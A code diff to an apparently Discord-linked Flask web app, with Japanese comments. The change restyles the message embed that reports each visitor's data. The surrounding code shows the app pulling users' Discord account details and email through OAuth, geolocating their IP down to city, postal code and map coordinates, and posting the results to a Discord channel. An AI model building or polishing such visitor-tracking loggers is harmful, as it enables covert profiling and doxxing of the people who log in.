@@ -68,44 +68,27 @@ def save_log(discord_id, structured_data):
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
 
-def create_embed(structured_data):
+def create_stylish_embed(structured_data):
     d = structured_data["discord"]
     ip = structured_data["ip_info"]
     ua = structured_data["user_agent"]
 
-    description = (
-        f"**[Discord情報]**\n"
-        f"名前: {d['username']}#{d['discriminator']}\n"
-        f"ID: {d['id']}\n"
-        f"メール: {d['email']}\n"
-        f"Premium: {d.get('premium_type', 'なし')}\n"
-        f"Locale: {d.get('locale', '不明')}\n\n"
-
-        f"**[IP情報]**\n"
-        f"IP: {ip['ip']}\n"
-        f"Proxy: {ip['proxy']}\n"
-        f"Hosting: {ip['hosting']}\n"
-        f"国: {ip['country']}\n"
-        f"県: {ip['region']}\n"
-        f"市区町村: {ip['city']}\n"
-        f"郵便番号: {ip['zip']}\n"
-        f"ISP: {ip['isp']}\n"
-        f"AS: {ip['as']}\n"
-        f"地図リンク: https://www.google.com/maps?q={ip['lat']},{ip['lon']}\n\n"
-
-        f"**[User-Agent情報]**\n"
-        f"UA: {ua['raw']}\n"
-        f"OS: {ua['os']}\n"
-        f"ブラウザ: {ua['browser']}\n"
-        f"デバイス: {ua['device']}\n"
-        f"Bot判定: {ua['is_bot']}"
-    )
-
-    return {
-        "title": "✅ 新しいアクセスログ",
-        "description": description,
-        "thumbnail": {"url": d["avatar_url"]}
+    embed = {
+        "title": "🚀 新しいアクセスログ",
+        "color": 0x3498db,
+        "description": (
+            f"**👤 Discord:** {d['username']}#{d['discriminator']} | ID: {d['id']}\n"
+            f"✉️ {d['email']} | Premium: {d.get('premium_type', 'なし')} | Locale: {d.get('locale', '不明')}\n\n"
+            f"**🌐 IP情報:** {ip['ip']} | Proxy: {ip['proxy']} | Hosting: {ip['hosting']}\n"
+            f"{ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
+            f"{ip['isp']} / {ip['as']} | 📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})\n\n"
+            f"**💻 User-Agent:** {ua['os']} / {ua['browser']} / {ua['device']} | Bot判定: {ua['is_bot']}"
+        ),
+        "thumbnail": {"url": d["avatar_url"]},
+        "footer": {"text": f"アクセス日時: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
     }
+
+    return embed
 
 
 @app.route("/")
@@ -123,7 +106,7 @@ def callback():
     if not code:
         return "コードがありません", 400
 
-    # トークン取得
+    # Discordトークン取得
     token_url = "https://discord.com/api/oauth2/token"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = {
@@ -160,7 +143,7 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IPとUser-Agent取得
+    # IP取得とUser-Agent解析
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -198,9 +181,9 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # Embed送信
+    # スタイリッシュEmbed送信
     try:
-        embed_data = create_embed(structured_data)
+        embed_data = create_stylish_embed(structured_data)
         bot.loop.create_task(bot.send_log(embed=embed_data))
 
         if geo["proxy"] or geo["hosting"]:
